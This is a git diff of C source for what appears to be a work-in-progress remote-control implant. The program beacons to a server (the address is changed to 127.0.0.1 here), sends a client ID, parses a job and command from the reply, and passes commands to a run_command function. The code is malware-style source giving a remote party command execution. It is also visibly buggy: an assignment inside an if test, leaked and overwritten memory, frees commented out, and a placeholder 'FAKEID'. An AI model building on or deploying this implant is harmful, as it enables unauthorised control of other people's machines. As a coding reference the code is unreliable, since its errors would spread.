@@ -1,3 +1,4 @@
+/* !! Continue this on the windows-dev machine */
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -18,7 +19,8 @@ char* run_command(char* command);
 int send_message(int sock, char *response);
 char * phone_home();
 char * client_id_generate();
-char * decision_tree(int sock, int valread, char * buffer);
+char * decision_tree(int sock);
+size_t decode_utf8(const char* utf8_str, char* decoded_str);
 
 //structs for the win... makes life easy :)
 struct connection {
@@ -46,7 +48,7 @@ int main() {
     server_connection.client_id = client_id_generate();
     server_connection.heartbeat = 15;
     server_connection.port = 100;
-    server_connection.address = "172.22.170.150";
+    server_connection.address = "127.0.0.1";
     //client id
 
     //char * client_id = client_id_generate();
@@ -114,6 +116,7 @@ char* phone_home(char* client_id) {
     serv_addr.sin_port = htons(server_connection.port);
     serv_addr.sin_addr.s_addr = inet_addr(server_connection.address);
 
+    
     // Convert IPv4 and IPv6 addresses from text to binary form
     if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) != 0) {
         printf("Connection error\n");
@@ -122,16 +125,18 @@ char* phone_home(char* client_id) {
         return "continue";
     }
 
+    /*
     // Heartbeat: on failed connection, 'wait' for X time & try to reconnect again. 
     if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
         printf("Connection error : %d", WSAGetLastError());
         closesocket(sock);
         WSACleanup();
         return "continue";
-    }
+    }*/
 
     else {
-        decision_tree(sock, valread, buffer);
+        printf("Running decision tree.");
+        decision_tree(sock);
     }
     
     
@@ -139,27 +144,48 @@ char* phone_home(char* client_id) {
 
 }
 
+/* !! The buffer is not getting passed properly, not 100% sure why, but it is filling the memory space with randomc haracters
+and that's why they are random as FUCK
+*/
 
 
 /* Del up to here for windows, then copy paste over*/
 
 //need to get proper variables passed here, atm the loop workds, but this is not set up yet
-char * decision_tree(int sock, int valread, char * buffer) {
-    
+char * decision_tree(int sock) {
+    char buffer[1024] = {0};
+    int valread;
     //printf("server first connection: %i\n", server_connection.first_connection);
 
+    //sending client_id
     send_message(sock, server_connection.client_id);
     printf("waiting on server response=======\n");
 
-    valread = read(sock, buffer, 1024);
-    printf("RECEIVED BACK: %s\n", buffer);
 
+    valread = read(sock, buffer, 1024);
+    printf("Response current Buffer: %s\n", buffer);
+
+    if (valread = -1 ) {
+        perror("Valread Error");
+    }
+
+    /* valread is gicing a -1, which means there's an error somewhere*/
+    printf("Response current Valread: %i\n", valread);
+
+    /* turning buffer into newbuffer (aka a char array)*/
     int len = strlen(buffer); // get the length of the string
     char* new_buffer = malloc(len + 1); // allocate memory for new buffer that can hold null character
     strcpy(new_buffer, buffer); // copy original string to new buffer
     new_buffer[len] = '\0';
 
+    //DEBUG: new_buffer doesn't equal anything
+    printf("new_buffer = %s\n", new_buffer);
 
+    if ( strcmp(new_buffer, "") ==0 ) {
+        new_buffer = "NoBuffer\\|/FromServer";
+        printf("Buffer not received from server!! \nFail Buffer is: %s\n", new_buffer);
+    }
+    
     job return_job = string_splitter(new_buffer);
 
     printf("\n%s, %s\n", return_job.job, return_job.command);
@@ -203,9 +229,9 @@ char * decision_tree(int sock, int valread, char * buffer) {
     //close(sock);
 
     //cleanup
-    free(return_job.job);
-    free(return_job.command);
-    free(new_buffer);
+    //free(return_job.job);
+    //free(return_job.command);
+    //free(new_buffer);
 
 
     return "continue";
@@ -239,7 +265,7 @@ int send_message(int sock, char *response) {
 
     sprintf(cat_response, "%s\\|/%s", server_connection.client_id, response);
 
-    printf(cat_response);
+    printf("cat_response = %s", cat_response);
 
     send(sock, cat_response, strlen(cat_response),0);
     free(cat_response);
@@ -255,48 +281,29 @@ int send_message(int sock, char *response) {
 //makes it easier to do returns and such as well (see job string_splitter)
 
 
+// seems to be nothing going into string_to_split... may be the casue of the random characters
 job string_splitter(char * string_to_split) {
-    printf(string_to_split);
-
-    job return_job = { NULL, NULL };
-
-    //giving these memory as they will be used outside of this function
-    return_job.job = malloc(1024);
-    return_job.command = malloc(1024);
-
-    if (string_to_split == NULL) {
-        printf("Error: string_to_split is NULL.\n");
-        return return_job;
+    //printf("string to split: %s", string_to_split);
+    job new_job;
+    new_job.job = malloc(100); // allocate memory for job field
+    new_job.command = malloc(1000); // allocate memory for command field
+    char * pch;
+    pch = strtok (string_to_split," ");
+    int i = 0;
+    while (pch != NULL)
+    {
+        if (i == 0) {
+            new_job.job = pch;
+        }
+        if (i == 1) {
+            new_job.command = pch;
+        }
+        pch = strtok (NULL, " ");
+        i++;
     }
     
-    char* splitter_queue;
-    char* first_part = NULL;
-    char* second_part = NULL;
-
-    splitter_queue = strtok(string_to_split, "\\|/"); //: \|/ is delim
-
-    if (splitter_queue != NULL) {
-        first_part = splitter_queue;
-        splitter_queue = strtok(NULL, "\\|/");
-        if (splitter_queue != NULL) {
-            second_part = splitter_queue;
-        }
-
-        /* Catch incase the server doesn't send anything in the second slot*/
-        else {
-            second_part = "empty_from_server";
-        }
-
-    } else {
-        printf("Error: delimiter not found in string.\n");
-        return return_job;
-    }
-
-    // copying first & second part to this struct
-    strcpy(return_job.job, first_part);
-    strcpy(return_job.command, second_part);
-
-    return return_job;
+    printf("new job %s ", new_job.job);
+    return new_job;
 }
 
 
@@ -331,6 +338,7 @@ char* run_command(char* raw_command) {
 }
 
 char * client_id_generate() {
+    /* Lol this function is terrible, need a better way for random strings
     // seed the random number generator with the current time
     srand(time(NULL));
 
@@ -338,6 +346,7 @@ char * client_id_generate() {
     // adding a spot in memory for this variable, as it will vanish otherwise (on return) if not allocated
     char* random_string = malloc(sizeof(char) * 6);
 
+    //looping 5 times, and associating a number with a letter
     for (int i = 0; i < 5; i++) {
         int random_number = rand() % 26;
         random_string[i] = 'A' + random_number;
@@ -345,8 +354,12 @@ char * client_id_generate() {
     //random_string[5] = '\0';
     
     // print the random string
-    printf("Random string: %i\n", random_string[6]);
+    printf("RandoString\n");
+    printf("Random string: %i", random_string[5]);
+    */
     
+    char * random_string = malloc(7);
+    strcpy(random_string, "FAKEID");
     return random_string;
 
 }
